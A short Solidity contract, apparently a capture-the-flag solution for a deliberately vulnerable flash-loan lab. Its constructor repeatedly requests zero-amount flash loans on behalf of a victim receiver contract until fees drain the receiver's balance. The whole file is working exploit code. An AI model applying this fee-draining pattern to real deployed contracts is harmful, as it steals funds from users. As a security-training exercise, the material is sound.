// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FlashLoanReceiver.sol";
import "./NaiveReceiverLenderPool.sol";

contract LenderPoolAttacker {
    constructor(NaiveReceiverLenderPool _pool, FlashLoanReceiver _receiver) {
        while(address(_receiver).balance >= _pool.fixedFee()) {
            _pool.flashLoan(address(_receiver), 0);
        }
    }
}
